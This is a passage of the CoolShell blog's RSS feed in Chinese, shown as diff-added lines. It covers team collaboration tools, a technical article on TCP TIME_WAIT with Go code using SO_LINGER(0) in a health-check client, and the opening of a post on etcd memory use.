+<p>团队协作和团队工作最大的基石是信任，如果有了信任，没有工具都会很爽，如果没有信任，什么工具都没用。信任是一种企业文化，这种文化不仅包括同级间的，还包括上下级间的。但是，因为国内的管理跟不上，所以，就导致了各种不信任的文化，而需要在这里不信任的文化中进行协同工作，国内的 IM 软件就会开发出如下在国外的 IM 中完全没有的功能：</p>
+<ul>
+<li><strong>监控员工</strong>。获取员工的工作时间以及工作位置。</li>
+<li><strong>有详细的已读标注</strong>。这样会给对方要回复的压力。</li>
+<li> <strong>发出的信息不能修改，不能删除，非常有限地可撤回</strong>。</li>
+</ul>
+<p>而国外的 IM 则是，发出的信息可以修改/删除，没有已读标准，也不会监控员工。这种时候，我总是会对工作在这种不信任文化中人感到可怜……如果大家需要靠逼迫的方式把对方拉来跟我一起协作，我们还工作个什么劲啊。</p>
+<h5>小结</h5>
+<p>所以，我们可以看到，<strong>畸形的企业管理和企业文化下，就会导致畸形的协同工具</strong>。最令人感到悲哀的是，有好多同学还觉得国内的钉钉非常之好，殊不知，你之所以感觉好用，是因为你所在的环境是如此的不堪。你看，<strong>人到了不同的环境就会有不同的认识，所以，找一个好一些的环境对一个人的成长有多重要</strong>。</p>
+<p>给一些新入行的人的建议就是，一个环境对一个人的认知会有非常大的影响，找一个好的环境是非常重要，如果不知道什么 环境是好的，那就先从不使用钉钉为工作协同软件的公司开始吧……</p>
+<h4>什么是好的协同工具</h4>
+<p>我们从上面可以得到，协同的前提条件是你需要有一个基于信任的企业文化，还需要有有结构化思维的科学的管理思维。没有这两个东西，给你的团队再多的工具都不可能有真正好有协同的，大家就是装模作样罢了。</p>
+<p>假设我们的管理和文化都没有问题，那下面我们来谈谈协同工具的事。</p>
+<p>我个人觉得 IM 这种工具包括会议都不是一种好的协同工具，因为这些工具都无法把信息做到真正的结构化和准确化，用 IM 或是开会上的信息大多都是碎片化严重，而且没有经过深度思考或是准备的，基本都是即兴出来的东西，不靠谱的概率非常大。</p>
+<p>找人交流和开会不是有个话题就好的，还需要一个可以讨论的“议案”。在 Amazon 里开会，会前，组织方会把要讨论的方案打印出来给大家看，这个方案是深思过的，是验证过的，是有数据和证据或是引用支撑的，会议开始后，10 -15分钟是没有人说话的，大家都在看文档，然后就开始直接讨论或发表意见，支持还是不支持，还是有条件支持……会议效率就会很高。</p>
+<p>但是这个议案其实是可以由大家一起来完成的，所以，连打印或是开会都不需要。试想一下，使用像 Google Doc 这样的协同文档工具，把大家拉到同一个文档里直接创作，不香吗？我在前段时间，在公网上组织大家来帮我完成一个《<a href="https://docs.google.com/document/d/1-c93ax4Uog_CHTOLBKpKLNCUtZYwacGbXm8OP3Fh810" target="_blank" rel="noopener">非常时期的囤货手册</a>》，这篇文章的形成有数百个网友的加持，而我就是在做一个主编的工作，这种工作是 IM 工具无法完成的事。与之类似的协同工具还有大家一起写代码的 Github，大家一起做设计的 Figma……这样创作类的协同工具非常多。另外，好多这些工具都能实时展示别人的创作过程，这个简直是太爽了，你可以通过观看他人创作过程，学习到很多他人的思路和想法，这个在没有协同工具的时代是很难想像的。</p>
+<p>好的协同工具是可以互相促进互相激励的，就像一个足球队一样，当你看到你的队友在勇敢地争抢，拼命地奔跑，你也会被感染到的。</p>
+<p>所以，<strong>好的协同就是能够跟一帮志同道合，有共同目标，有想法，有能力的人一起做个什么事</strong>。<strong>所以，在我心中我最喜欢的协同工具从来都是创作类的，不是管理类的，更不是聊天类的。</strong>管理和聊天的协同软件会让你产生一种有产出的假象，但其实不同，这种工具无论做的有多好，都是支持性的工具，不是产出类的工具，不会提升生产力的。</p>
+<p>另外，在创作类的协同工具上如果有一些智能小帮手，如：Github 发布的 Copilot。那简直是让人爽翻天了，所以，真正能提升生产力的工具都是在内容上帮得到你的。</p>
+<h4>结束语</h4>
+<p>我其实并不喜欢今天所有的 IM 工具，因为我觉得信息不是结构化的，信息是有因果关系和上下文的，是结构化的，是多维度的，不是今天这种线性的方式，我们想像一下“脑图”或是知识图，或是 wikipedia 的网关的关联，我们可能就能想像得到一个更好的 IM 应该是什么 样的……</p>
+<p>协同工作的想像空间实在是太大了，我觉得所有的桌面端的软件都会被协作版的重写，虽然，这种协作软件需要有网络的加持，但是协作软件的魅力和诱惑力实在的太大了，让人无法不从……</p>
+<p>未来的企业，那些管理类的工具一定会被边缘化的，聊天类的会被打成一个通知中心，而创作类的会大放异彩，让大家直接在要干的事上进行沟通、交互和分享。</p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png" alt="“一把梭：REST API 全用 POST”" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_title">“一把梭：REST API 全用 POST”</a></li><li ><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg" alt="谈谈公司对员工的监控" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_title">谈谈公司对员工的监控</a></li><li ><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg" alt="如何做一个有质量的技术分享" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a></li><li ><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png" alt="程序员如何把控自己的职业" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a></li><li ><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/01/remote-150x150.jpg" alt="MegaEase的远程工作文化" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a></li><li ><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/12/open-your-creative-mind-150x150.jpg" alt="别让自己“墙”了自己" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/22298.html">聊聊团队协同和协同工具</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/22298.html/feed</wfw:commentRss>
+			<slash:comments>52</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>从一次经历谈 TIME_WAIT 的那些事</title>
+		<link>https://coolshell.cn/articles/22263.html</link>
+					<comments>https://coolshell.cn/articles/22263.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 19 Jul 2022 06:43:39 +0000</pubDate>
+				<category><![CDATA[Go 语言]]></category>
+		<category><![CDATA[Unix/Linux]]></category>
+		<category><![CDATA[操作系统]]></category>
+		<category><![CDATA[编程语言]]></category>
+		<category><![CDATA[SO_LINGER]]></category>
+		<category><![CDATA[TCP]]></category>
+		<category><![CDATA[TIME_WAIT]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=22263</guid>
+
+					<description><![CDATA[<p>今天来讲一讲TCP 的 TIME_WAIT 的问题。这个问题尽人皆知，不过，这次遇到的是不太一样的场景，前两天也解决了，正好写篇文章，顺便把 TIME_WAIT...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/22263.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/22263.html">从一次经历谈 TIME_WAIT 的那些事</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright" src="https://coolshell.cn/wp-content/uploads/2022/07/wall_clock-300x167.jpeg" alt="" width="400" height="222" />今天来讲一讲TCP 的 <code>TIME_WAIT</code> 的问题。这个问题尽人皆知，不过，这次遇到的是不太一样的场景，前两天也解决了，正好写篇文章，顺便把 <code>TIME_WAIT</code> 的那些事都说一说。对了，这个场景，跟我开源的探活小工具 <a href="https://github.com/megaease/easeprobe">EaseProbe</a> 有关，我先说说这个场景里的问题，然后，顺着这个场景跟大家好好说一下这个事。</p>
+<h4>问题背景</h4>
+<p>先说一下背景，<a href="https://github.com/megaease/easeprobe">EaseProbe</a> 是一个轻量独立的用来探活服务健康状况的小工具，支持http/tcp/shell/ssh/tls/host以及各种中间件的探活，然后，直接发送通知到主流的IM上，如：Slack/Telegram/Discrod/Email/Team，包括国内的企业微信/钉钉/飞书， 非常好用，用过的人都说好 <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f60f.png" alt="😏" class="wp-smiley" style="height: 1em; max-height: 1em;" />。</p>
+<p>这个探活工具在每次探活的时候，必须要从头开始建立整个网络链接，也就是说，需要从头开始进行DNS查询，建立TCP链接，然后进行通信，再关闭链接。这里，我们不会设置 TCP 的 KeepAlive 重用链接，因为探活工具除了要探活所远端的服务，还要探活整个网络的情况，所以，每次探活都需要从新来过，这样才能捕捉得到整个链路的情况。</p>
+<p><span id="more-22263"></span></p>
+<p>但是，这样不断的新建链接和关闭链接，根据TCP的状态机，我们知道这会导致在探测端这边出现的 <code>TIME_WAIT</code> 的 TCP 链接，根据 TCP 协议的定义，这个 TIME_WAIT 需要等待 2倍的MSL 时间，TCP 链接都会被系统回收，在回收之前，这个链接会占用系统的资源，主要是两个资源，一个是文件描述符，这个还好，可以调整，另一个则是端口号，这个是没法调整的，因为作为发起请求的client来说，在对同一个IP上理论上你只有64K的端口号号可用（实际上系统默认只有近30K，从32,768 到 60,999 一共 60999+1-32768=28,232，你可以通过 <code>sysctl net.ipv4.ip_local_port_range</code> 查看  ），如果 <code>TIME_WAIT</code> 过多，会导致TCP无法建立链接，还会因为资源消耗太多导致整个程序甚至整个系统异常。</p>
+<p>试想，如果我们以 10秒为周期探测10K的结点，如果TIME_WAIT的超时时间是120秒，那么在第60秒后，等着超时的 <code>TIME_WAIT</code> 我们就有可能把某个IP的端口基本用完了，就算还行，系统也有些问题。（注意：我们不仅仅只是TCP，还有HTTP协议，所以，大家不要觉得TCP的四元组只要目标地址不一样就好了，一方面，我们探的是域名，需要访问DNS服务，所以，DNS服务一般是一台服务器，还有，因为HTTPS一般是探API，而且会有网关代理API，所以链接会到同一个网关上。另外就算还可以建出站连接，但是本地程序会因为端口耗尽无法bind了。所以，现实情况并不会像理论情况那样只要四元组不冲突，端口就不会耗尽）</p>
+<h4>为什么要 TIME_WAIT</h4>
+<p>那么，为什么TCP在 <code>TIME_WAIT</code> 上要等待一个2MSL的时间？<code></code></p>
+<p>以前写过篇比较宏观的《TCP的那些事》（<a title="TCP 的那些事儿（上）" href="https://coolshell.cn/articles/11564.html" target="_blank" rel="noopener">上篇</a>，<a title="TCP 的那些事儿（下）" href="https://coolshell.cn/articles/11609.html" target="_blank" rel="noopener">下篇</a>），这个访问在“上篇”里讲过，这里再说一次，TCP 断链接的时候，会有下面这个来来回回的过程。</p>
+<p>我们来看主动断链接的最后一个状态 <code>TIME_WAIT</code> 后就不需要等待对端回 ack了，而是进入了超时状态。这主要是因为，在网络上，如果要知道我们发出的数据被对方收到了，那我们就需要对方发来一个确认的Ack信息，那问题来了，对方怎么知道自己发出去的ack，被收到了？难道还要再ack一下，这样ack来ack回的，那什么谁也不要玩了……是的，这就是比较著名的【两将军问题】——两个将军需要在一个不稳定的信道上达成对敌攻击时间的协商，A向B派出信鸽，我们明早8点进攻，A怎么知道B收到了信？那需要B向A派出信鸽，ack说我收到了，明早8点开干。但是，B怎么知道A会收到自己的确认信？是不是还要A再确认一下？这样无穷无尽的确认导致这个问题是没有完美解的（我们在《<a href="https://coolshell.cn/articles/10910.html#Two_Generals_Problem%EF%BC%88%E4%B8%A4%E5%B0%86%E5%86%9B%E9%97%AE%E9%A2%98%EF%BC%89" target="_blank" rel="noopener">分布式事务</a>》一文中说过这个问题，这里不再重述）</p>
+<p>所以，我们只能等一个我们认为最大小时来解决两件个问题：</p>
+<p>1） 为了 <strong>防止来自一个连接的延迟段</strong>被依赖于相同四元组（源地址、源端口、目标地址、目标端口）的稍后连接接受（被接受后，就会被马上断掉，TCP状态机紊乱）。虽然，可以通过指定 TCP 的 sequence number 一定范围内才能被接受。但这也只是让问题发生的概率低了一些，对于一个吞吐量大的的应用来说，依然能够出现问题，尤其是在具有大接收窗口的快速连接上。<a title="RFC 1337：TCP 中的 TIME-WAIT 暗杀危险" href="https://tools.ietf.org/html/rfc1337">RFC 1337</a>详细解释了当 <code>TIME-WAIT</code>状态不足时会发生什么。<sup id="fnref-rfc1337"></sup><code>TIME-WAIT</code>以下是如果不缩短状态可以避免的示例：</p>
+<figure id="attachment_22267" aria-describedby="caption-attachment-22267" style="width: 456px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="wp-image-22267" src="https://coolshell.cn/wp-content/uploads/2022/07/duplicate-segment.png" alt="" width="456" height="467" srcset="https://coolshell.cn/wp-content/uploads/2022/07/duplicate-segment.png 800w, https://coolshell.cn/wp-content/uploads/2022/07/duplicate-segment-293x300.png 293w, https://coolshell.cn/wp-content/uploads/2022/07/duplicate-segment-768x787.png 768w, https://coolshell.cn/wp-content/uploads/2022/07/duplicate-segment-263x270.png 263w" sizes="(max-width: 456px) 100vw, 456px" /><figcaption id="caption-attachment-22267" class="wp-caption-text">由于缩短的 TIME-WAIT 状态，后续的 TCP 段已在不相关的连接中被接受（<a href="https://vincent.bernat.ch/en/blog/2014-tcp-time-wait-state-linux" target="_blank" rel="noopener">来源</a>）</figcaption></figure>
+<p>&nbsp;</p>
+<p>2）另一个目的是确保<strong>远端已经关闭了连接</strong>。当最后一个<em>ACK</em>​​ 丢失时，对端保持该<code>LAST-ACK</code>状态。<sup id="fnref-lastack"></sup>在没有<code>TIME-WAIT</code>状态的情况下，可以重新打开连接，而远程端仍然认为先前的连接有效。当它收到一个<em>SYN</em>段（并且序列号匹配）时，它将以<em>RST</em>应答，因为它不期望这样的段。新连接将因错误而中止：</p>
+<p>&nbsp;</p>
+<figure id="attachment_22268" aria-describedby="caption-attachment-22268" style="width: 559px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="wp-image-22268" src="https://coolshell.cn/wp-content/uploads/2022/07/last-ack.png" alt="" width="559" height="375" srcset="https://coolshell.cn/wp-content/uploads/2022/07/last-ack.png 783w, https://coolshell.cn/wp-content/uploads/2022/07/last-ack-300x201.png 300w, https://coolshell.cn/wp-content/uploads/2022/07/last-ack-768x515.png 768w, https://coolshell.cn/wp-content/uploads/2022/07/last-ack-403x270.png 403w" sizes="(max-width: 559px) 100vw, 559px" /><figcaption id="caption-attachment-22268" class="wp-caption-text">如果远端因为最后一个 ACK​​ 丢失而停留在 LAST-ACK 状态，则打开具有相同四元组的新连接将不起作用 （<a href="https://vincent.bernat.ch/en/blog/2014-tcp-time-wait-state-linux" target="_blank" rel="noopener">来源</a>）</figcaption></figure>
+<p><code>TIME_WAIT</code> 的这个超时时间的值如下所示：</p>
+<ul>
+<li>在 macOS 上是15秒， <code>sysctl net.inet.tcp | grep net.inet.tcp.msl</code></li>
+<li>在 Linux 上是 60秒 <code>cat /proc/sys/net/ipv4/tcp_fin_timeout</code></li>
+</ul>
+<h4>解决方案</h4>
+<p>要解决这个问题，网上一般会有下面这些解法</p>
+<ul>
+<li>把这个超时间调小一些，这样就可以把TCP 的端口号回收的快一些。但是也不能太小，如果流量很大的话，TIME_WAIT一样会被耗尽。</li>
+<li>设置上 <code>tcp_tw_reuse</code> 。<a title="RFC 1323：高性能 TCP 扩展" href="https://tools.ietf.org/html/rfc1323">RFC 1323</a>提出了一组 TCP 扩展来提高高带宽路径的性能。除其他外，它定义了一个新的 TCP 选项，带有两个四字节<strong>时间戳字段</strong>。第一个是发送选项的 TCP 时间戳的当前值，而第二个是从远程主机接收到的最新时间戳。如果新时间戳严格大于为前一个连接记录的最新时间戳。Linux 将重用该状态下的现有 <code>TIME_WAIT</code> 连接用于<strong>出站的链接</strong>。也就是说，<strong>这个参数对于入站连接是没有任何用图的。</strong></li>
+<li>设置上 <code>tcp_tw_recycle</code> 。 这个参数同样依赖于时间戳选项，但会影响进站和出站链接。这个参数会影响NAT环境，也就是一个公司里的所有员工用一个IP地址访问外网的情况。在这种情况下，时间戳条件将禁止在这个公网IP后面的所有设备在一分钟内连接，因为它们不共享相同的时间戳时钟。毫无疑问，禁用此选项要好得多，因为它会导致 <strong>难以检测</strong>和<strong>诊断</strong>问题。（注：从 Linux 4.10 (commit <a title="tcp：为每个连接随机化 tcp 时间戳偏移" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a22caee396cef0bb2ca8fafdd82966a49367bb">95a22caee396</a> ) 开始，Linux 将为每个连接随机化时间戳偏移量，从而使该选项完全失效，无论有无<abbr title="网络地址解读">NAT</abbr>。它已从 Linux 4.12中完全删除）</li>
+</ul>
+<p>对于服务器来说，上述的三个访问都不能解决服务器的 <code>TIME_WAIT</code> 过多的问题，真正解决问题的就是——<strong>不作死就不会死，也就是说，服务器不要主动断链接，而设置上KeepAlive后，让客户端主动断链接，这样服务端只会有<code>CLOSE_WAIT</code></strong>。</p>
+<p>但是对于用于建立出站连接的探活的 EaseProbe来说，设置上 <code>tcp_tw_reuse</code> 就可以重用 <code>TIME_WAIT</code> 了，但是这依然无法解决 <code>TIME_WAIT</code> 过多的问题。</p>
+<p>然后，过了几天后，我忽然想起来以前在《UNIX 网络编程》上有看到过一个Socket的参数，叫 <code data-enlighter-language="raw" class="EnlighterJSRAW">&lt;code&gt;SO_LINGER</code></code>，我的编程生涯中从来没有使用过这个设置，这个参数主要是为了延尽关闭来用的，也就是说你应用调用 <code>close()</code>函数时，如果还有数据没有发送完成，则需要等一个延时时间来让数据发完，但是，如果你把延时设置为 0  时，Socket就丢弃数据，并向对方发送一个 <code>RST</code> 来终止连接，因为走的是 RST 包，所以就不会有 <code>TIME_WAIT</code> 了。</p>
+<p>这个东西在服务器端永远不要设置，不然，你的客户端就总是看到 TCP 链接错误 “connnection reset by peer”，但是这个参数对于 EaseProbe 的客户来说，简直是太完美了，当EaseProbe 探测完后，直接 reset connection， 即不会有功能上的问题，也不会影响服务器，更不会有烦人的 <code> TIME_WAIT</code> 问题。</p>
+<h4>Go 实际操作</h4>
+<p>在 Golang的标准库代码里，<code>net.TCPConn</code> 有个方法 <code>SetLinger()</code>可以完成这个事，使用起来也比较简单：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">conn, _ := net.DialTimeout("tcp", t.Host, t.Timeout())
+
+if tcpCon, ok := conn.(*net.TCPConn); ok {
+    tcpCon.SetLinger(0)
+}</pre>
+<p>你需要把一个 <code>net.Conn</code>  转型成 <code>net.TCPConn</code>，然后就可以调用方法了。</p>
+<p>但是对于Golang 的标准库中的 HTTP 对象来说，就有点麻烦了，Golang的 http 库把底层的这边连接对象全都包装成私有变量了，你在外面根本获取不到。这篇《<a href="https://iximiuz.com/en/posts/go-net-http-setsockopt-example/" target="_blank" rel="noopener">How to Set Go net/http Socket Options &#8211; setsockopt() example</a> 》中给出了下面的方法：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">dialer := &amp;net.Dialer{
+    Control: func(network, address string, conn syscall.RawConn) error {
+        var operr error
+        if err := conn.Control(func(fd uintptr) {
+            operr = syscall.SetsockoptInt(int(fd), unix.SOL_SOCKET, unix.TCP_QUICKACK, 1)
+        }); err != nil {
+            return err
+        }
+        return operr
+    },
+}
+
+client := &amp;http.Client{
+    Transport: &amp;http.Transport{
+        DialContext: dialer.DialContext,
+    },
+}</pre>
+<p>上面这个方法非常的低层，需要直接使用setsocketopt这样的系统调用，我其实，还是想使用 <code>TCPConn.SetLinger(0)</code> 来完成这个事，即然都被封装好了，最好还是别破坏封闭性碰底层的东西。</p>
+<p>经过Golang http包的源码阅读和摸索，我使用了下面的方法：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">client := &amp;http.Client{
+    Timeout: h.Timeout(),
+    Transport: &amp;http.Transport{
+      TLSClientConfig:   tls,
+      DisableKeepAlives: true,
+      DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+        d := net.Dialer{Timeout: h.Timeout()}
+        conn, err := d.DialContext(ctx, network, addr)
+        if err != nil {
+          return nil, err
+        }
+        tcpConn, ok := conn.(*net.TCPConn)
+        if ok {
+          tcpConn.SetLinger(0)
+          return tcpConn, nil
+        }
+        return conn, nil
+      },
+    },
+  }</pre>
+<p>然后，我找来了全球 T0p 100W的域名，然后在AWS上开了一台服务器，用脚本生成了 TOP 10K 和 20K 的网站来以5s, 10s, 30s, 60s的间隔进行探活，搞到Cloudflare 的 1.1.1.1 DNS 时不时就把我拉黑，最后的测试结果也非常不错，根本 没有 TIME_WAIT 的链接，相关的测试方法、测试数据和测试报告可以参看：<a href="https://github.com/megaease/easeprobe/blob/main/docs/Benchmark.md" target="_blank" rel="noopener">Benchmark Report</a></p>
+<h4>总结</h4>
+<p>下面是几点总结</p>
+<ul>
+<li><code>TIME_WAIT</code> 是一个TCP 协议完整性的手段，虽然会有一定的副作用，但是这个设计是非常关键的，最好不要妥协掉。</li>
+<li>永远不要使用  <code>tcp_tw_recycle</code> ，这个参数是个巨龙，破坏力极大。</li>
+<li>服务器端永远不要使用  <code>SO_LINGER(0)</code>，而且使用 <code>tcp_tw_reuse</code> 对服务端意义不大，因为它只对出站流量有用。</li>
+<li>在服务端上最好不要主动断链接，设置好KeepAlive，重用链接，让客户端主动断链接。</li>
+<li>在客户端上可以使用 <code>tcp_tw_reuse</code>  和 <code>SO_LINGER(0)</code>。</li>
+</ul>
+<p>最后强烈推荐阅读这篇文章 &#8211; <a href="https://vincent.bernat.ch/en/blog/2014-tcp-time-wait-state-linux" target="_blank" rel="noopener">Coping with the TCP TIME-WAIT state on busy Linux servers</a></p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/11564.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/05/tin-can-phone-150x150.jpg" alt="TCP 的那些事儿（上）" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11564.html" class="wp_rp_title">TCP 的那些事儿（上）</a></li><li ><a href="https://coolshell.cn/articles/19840.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/10/HTTP-770x513-300x200-1-150x150.jpg" alt="HTTP的前世今生" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19840.html" class="wp_rp_title">HTTP的前世今生</a></li><li ><a href="https://coolshell.cn/articles/11609.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/05/xin_2001040422167711230318-150x150.jpg" alt="TCP 的那些事儿（下）" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11609.html" class="wp_rp_title">TCP 的那些事儿（下）</a></li><li ><a href="https://coolshell.cn/articles/9859.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/06/Alan-Cox-150x150.jpg" alt="Alan Cox：单向链表中prev指针的妙用" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9859.html" class="wp_rp_title">Alan Cox：单向链表中prev指针的妙用</a></li><li ><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/06/f1-150x150.jpg" alt="性能调优攻略" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_title">性能调优攻略</a></li><li ><a href="https://coolshell.cn/articles/1484.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/09/tcp1-150x150.jpg" alt="TCP网络关闭的状态变换时序图" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1484.html" class="wp_rp_title">TCP网络关闭的状态变换时序图</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/22263.html">从一次经历谈 TIME_WAIT 的那些事</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/22263.html/feed</wfw:commentRss>
+			<slash:comments>31</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>ETCD的内存问题</title>
+		<link>https://coolshell.cn/articles/22242.html</link>
+					<comments>https://coolshell.cn/articles/22242.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Thu, 05 May 2022 08:13:37 +0000</pubDate>
+				<category><![CDATA[Go 语言]]></category>
+		<category><![CDATA[程序设计]]></category>
+		<category><![CDATA[easegress]]></category>
+		<category><![CDATA[etcd]]></category>
+		<category><![CDATA[Go]]></category>
+		<category><![CDATA[Performance]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=22242</guid>
+
+					<description><![CDATA[<p>今天跟大家分享一个etcd的内存大量占用的问题，这是前段时间在我们开源软件Easegress中遇到的问题，问题是比较简单的，但是我还想把前因后果说一下，包括，为...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/22242.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/22242.html">ETCD的内存问题</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright size-full wp-image-22247" src="https://coolshell.cn/wp-content/uploads/2022/05/etcd.png" alt="" width="275" height="183" />今天跟大家分享一个etcd的内存大量占用的问题，这是前段时间在我们开源软件Easegress中遇到的问题，问题是比较简单的，但是我还想把前因后果说一下，包括，为什么要用etcd，使用etcd的用户场景，包括etcd的一些导致内存占用比较大的设计，以及最后一些建议。希望这篇文章不仅仅只是让你看到了一个简单的内存问题，还能让你有更多的收获。当然，也欢迎您关注我们的开源软件，给我们一些鼓励。</p>
+<h4>为什么要用ETCD</h4>
+<p>先说一下为什么要用etcd。先从一个我们自己做的一个API网关 &#8211; Easegress（<a href="https://github.com/megaease/easegress">源码</a>）说起。</p>
+<p><a href="https://github.com/megaease/easegress" target="_blank" rel="noopener">Easegress</a> 是我们开发并开源的一个API应用网关产品，这个API应用网关不仅仅只是像nginx那样用来做一个反向代理，这个网关可以做的事很多，比如：API编排、服务发现、弹力设计（熔断、限流、重试等）、认证鉴权（JWT，OAuth2，HMAC等）、同样支持各种Cloud Native的架构如：微服务架构，Service Mesh，Serverless/FaaS的集成，并可以用于扛高并发、灰度发布、全链路压力测试、物联网……等更为高级的企业级的解决方案。所以，为了达到这些目标，在2017年的时候，我们觉得在现有的网关如Nginx上是无法演进出来这样的软件的，必需重新写一个（后来其他人也应该跟我们的想法一样，所以，Lyft写了一个Envoy。只不过，Envoy是用C++写的，而我用了技术门槛更低的Go语言）</p>
+<p>另外，Easegress最核心的设计主要有三个：</p>
+<p><span id="more-22242"></span></p>
+<ul>
+<li>一是无第三方依赖的自己选主组集群的能力</li>
+<li>二是像Linux管道命令行那样pipeline式的插件流式处理（支持Go/WebAssembly）</li>
+<li>三是内置一个Data Store用于集群控制和数据共享。</li>
+</ul>
+<p>对于任何一个分布式系统，都需要有一个强一制性的基于Paxos/Raft的可以自动选主机制，并且需要在整个集群间同步一些关键的控制/配置和相关的共享数据，以保证整个集群的行为是统一一致的。如果没有这么一个东西的话，就没有办法玩分布式系统的。这就是为什么会有像Zookeeper/etcd这样的组件出现并流行的原因。注意，Zookeeper他们主要不是给你存数据的，而是给你组集群的。</p>
